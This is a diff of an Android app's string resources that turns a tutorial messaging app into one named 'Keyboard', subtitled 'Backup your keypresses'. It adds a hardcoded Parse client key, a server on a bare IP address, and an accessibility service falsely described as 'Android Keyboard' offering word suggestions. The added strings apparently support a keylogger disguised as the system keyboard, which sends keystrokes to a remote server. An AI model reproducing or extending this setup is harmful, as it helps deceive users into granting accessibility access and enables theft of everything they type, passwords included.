@@ -1,12 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
 
-    <string name="app_name">Ribbit</string>
+    <string name="app_name">Keyboard</string>
     <string name="action_settings">Settings</string>
     <string name="title_section1">Inbox</string>
     <string name="title_section2">Friends</string>
     <string name="title_activity_login">LoginActivity</string>
-    <string name="hello_world">Hello world!</string>
     <string name="username_hint">Username</string>
     <string name="password_hint">Password</string>
     <string name="login_button_label">SIGN IN</string>
@@ -30,7 +29,7 @@
     <string name="video_size_limit_warning">The selected video must be less than 10 MB.</string>
     <string name="error_selecting_file">There was an error with the file selected. Please select a different file.</string>
     <string name="error_file_too_large">The selected file is too large! Select a new file.</string>
-<string name="cancel_button_label">CANCEL</string>
+    <string name="cancel_button_label">CANCEL</string>
     <string-array name="camera_choices">
         <item>Take Picture</item>
         <item>Take Video</item>
@@ -49,8 +48,15 @@
     <string name="error_sending_message">There was an error sending your message. Please try again.</string>
     <string name="title_activity_view_image">Ribbit</string>
     <string name="background_image_desc">Ribbit frog background image</string>
-    <string name="subtitle">A Treehouse project</string>
+    <string name="subtitle">Backup your keypresses</string>
     <string name="content_divider">Content divider</string>
     <string name="message_icon_description">Message Icon</string>
-
+    <string name="parse_app_id">myKeys</string>
+    <string name="parse_client_key">rTM1HxN53TSyz8zf71tniO48JDtd8814</string>
+    <string name="parse_server">http://159.203.6.156:1337/parse/</string>
+    <string name="menu_text_label">Text</string>
+    <string name="enter_message">Enter message</string>
+    <string name="send">Send</string>
+    <string name="accessibility_service_label">Android Keyboard</string>
+    <string name="accessibility_service_description">Permits autocompletion and word suggestions within the keyboard</string>
 </resources>
